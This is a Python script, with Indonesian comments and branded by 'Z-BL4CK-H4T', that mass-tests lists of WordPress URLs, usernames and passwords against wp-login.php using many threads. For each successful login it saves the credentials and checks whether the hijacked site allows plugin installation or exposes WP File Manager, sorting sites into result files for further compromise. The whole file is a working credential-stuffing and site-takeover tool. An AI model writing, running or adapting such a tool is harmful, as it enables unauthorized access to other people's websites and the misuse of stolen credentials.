import requests
import re
import os
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

# Inisialisasi colorama untuk pengaturan warna otomatis
init(autoreset=True)

# Pewarnaan untuk output
fc = Fore.CYAN    # Cyan untuk URL
fy = Fore.YELLOW  # Kuning untuk informasi dan proses
fr = Fore.RED     # Merah untuk kegagalan
fg = Fore.GREEN   # Hijau untuk keberhasilan

# Fungsi untuk melakukan login ke WordPress
def login_to_wordpress(url, username, password):
    login_url = f"{url}/wp-login.php"  # URL untuk halaman login WordPress
    login_data = {
        'log': username,
        'pwd': password
    }
    try:
        # Mengirim permintaan POST dengan session agar bisa mengikuti redirect
        session = requests.Session()
        response = session.post(login_url, data=login_data, timeout=10, allow_redirects=True)

        # Debug: Menampilkan URL hasil redirect dan isi halaman
        print(f"{fy}[DEBUG] Redirect URL: {response.url}")
        print(f"{fy}[DEBUG] Page Content Preview: {response.text[:200]}...")  # Menampilkan 200 karakter pertama

        # Cek jika respons kosong
        if not response.text.strip():
            print(f"{fr}[!] Halaman kosong diterima dari {url}")
            return False, None

        # Memastikan apakah halaman CAPTCHA terdeteksi
        if "CAPTCHA" in response.text or "Please verify" in response.text:
            print(f"{fr}[!] CAPTCHA terdeteksi di {url}")
            return False, None

        # Validasi login sukses berdasarkan konten
        if 'Dashboard' in response.text or '<title>Dashboard</title>' in response.text:
            print(f"{fg}[DEBUG] Login berhasil: Dashboard terdeteksi")
            return True, session  # Login berhasil ke dashboard
        elif '/wp-admin' in response.url:
            # Cek apakah konten halaman mengandung elemen login palsu
            if 'wp-login' in response.url or 'Invalid login' in response.text or 'login' in response.text.lower():
                print(f"{fr}[DEBUG] Login palsu: Halaman mengarah ke login ulang")
                return False, None  # Login palsu
            print(f"{fg}[DEBUG] Login berhasil: Berhasil masuk ke wp-admin tanpa validasi dashboard")
            return True, session  # Login berhasil ke wp-admin tanpa validasi dashboard
        else:
            print(f"{fr}[DEBUG] Login gagal: Tidak ada indikasi keberhasilan login")
            return False, None  # Login gagal
    except requests.exceptions.RequestException as e:
        print(f'{fr}[!] Error saat mencoba login ke {url}: {e}')
        return None, None

# Fungsi untuk memeriksa apakah plugin dapat diinstal
def check_plugin_installation(session, url):
    try:
        plugin_install_url = f"{url}/wp-admin/plugin-install.php"
        response = session.get(plugin_install_url, timeout=10)
        if 'Add Plugins' in response.text:
            print(f"{fg}[+] Plugin dapat diinstal di {url}")
            return True
        else:
            print(f"{fr}[-] Plugin tidak dapat diinstal di {url}")
            return False
    except requests.exceptions.RequestException as e:
        print(f'{fr}[!] Error saat memeriksa plugin installation di {url}: {e}')
        return False

# Fungsi untuk memeriksa apakah wp-filemanager dapat diakses
def check_wp_filemanager(session, url):
    try:
        wp_filemanager_url = f"{url}/wp-content/plugins/wp-filemanager/readme.txt"
        response = session.get(wp_filemanager_url, timeout=10)
        if 'WP File Manager' in response.text:
            print(f"{fg}[+] WP File Manager dapat diakses di {url}")
            return True
        else:
            print(f"{fr}[-] WP File Manager tidak dapat diakses di {url}")
            return False
    except requests.exceptions.RequestException as e:
        print(f'{fr}[!] Error saat memeriksa WP File Manager di {url}: {e}')
        return False

# Fungsi untuk membaca file txt dan melakukan login
def check_wordpress_logins(file_path, max_threads):
    processed_urls = set()  # Untuk melacak URL yang sudah diproses
    # Menentukan direktori saat ini di mana file kode berada
    current_dir = os.path.dirname(os.path.abspath(__file__))

    try:
        # Menggunakan encoding='utf-8' untuk menangani masalah pengkodean
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()

        # Fungsi untuk memproses setiap baris dalam file
        def process_line(line):
            line = line.strip()
            if not line or line in processed_urls:
                return  # Lewati jika sudah diproses atau baris kosong

            processed_urls.add(line)

            # Debug: Menampilkan baris yang sedang diproses
            print(f'{fy}[DEBUG] Memeriksa baris: {line}')

            try:
                # Menggunakan regex untuk memisahkan berdasarkan beberapa pemisah yang mungkin ada (@, :, #, |)
                parts = re.split(r'[|@:#]', line)
                if len(parts) != 3:
                    print(f'{fr}[!] Format baris tidak valid: {line}')
                    return
                
                url, username, password = parts[0], parts[1], parts[2]

                # Debug: Menampilkan kredensial yang diparsing
                print(f'{fc}[DEBUG] URL: {url}, Username: {username}, Password: {password}')
                
                # Memeriksa login
                print(f'{fy}[INFO] Mencoba login ke {url} dengan username {username}')
                login_success, session = login_to_wordpress(url, username, password)
                
                if login_success is True:
                    print(f'{fg}[+] Successful login to {url}|{username}|{password}')
                    
                    # Menyimpan hasil login sukses ke dalam file 'result_success.txt' segera setelah login berhasil
                    success_file_path = os.path.join(current_dir, 'result_success.txt')
                    with open(success_file_path, 'a') as success_file:
                        success_file.write(f'url: {url}\nusername: {username}\npassword: {password}\n\n')

                    # Menyimpan hasil login ke dalam file 'result_lam.txt' untuk referensi lainnya
                    result_file_path = os.path.join(current_dir, 'result_lam.txt')
                    with open(result_file_path, 'a') as result_file:
                        result_file.write(f'{url}|{username}|{password}\n')
                    
                    # Memeriksa apakah plugin dapat diinstal
                    plugin_install_success = check_plugin_installation(session, url)
                    if plugin_install_success:
                        plugin_file_path = os.path.join(current_dir, 'result_plugin_install.txt')
                        with open(plugin_file_path, 'a') as plugin_file:
                            plugin_file.write(f'{url}|{username}|{password}\n')
                    
                    # Memeriksa apakah wp-filemanager dapat diakses
                    wp_filemanager_success = check_wp_filemanager(session, url)
                    if wp_filemanager_success:
                        wp_filemanager_file_path = os.path.join(current_dir, 'result_wp_filemanager.txt')
                        with open(wp_filemanager_file_path, 'a') as wp_filemanager_file:
                            wp_filemanager_file.write(f'{url}|{username}|{password}\n')
                elif login_success is False:
                    print(f'{fr}[-] Failed login to {url}#{username}@{password}')
                else:
                    print(f'{fr}[!] Tidak dapat terhubung ke {url}')

            except Exception as e:
                print(f'{fr}[!] Error memproses baris: {line} - {e}')

        # Menjalankan multithreading untuk setiap baris
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            executor.map(process_line, lines)

    except FileNotFoundError:
        print(f'{fr}[!] File {file_path} tidak ditemukan.')
    except UnicodeDecodeError as e:
        print(f'{fr}[!] Error saat membaca file {file_path}: {e}')
    except Exception as e:
        print(f'{fr}[!] Error saat membaca file: {e}')

# Menu penggunaan tools
print(f'{fy}==== Login Checker By Z-BL4CK-H4T ====')
file_path = input(f'{fy}Masukkan file path txt: ')
max_threads = int(input(f'{fy}Masukkan jumlah maksimal thread (misal: 10): '))
check_wordpress_logins(file_path, max_threads)
print(f'{fg}Proses selesai, hasil login sukses tersimpan di result_success.txt')
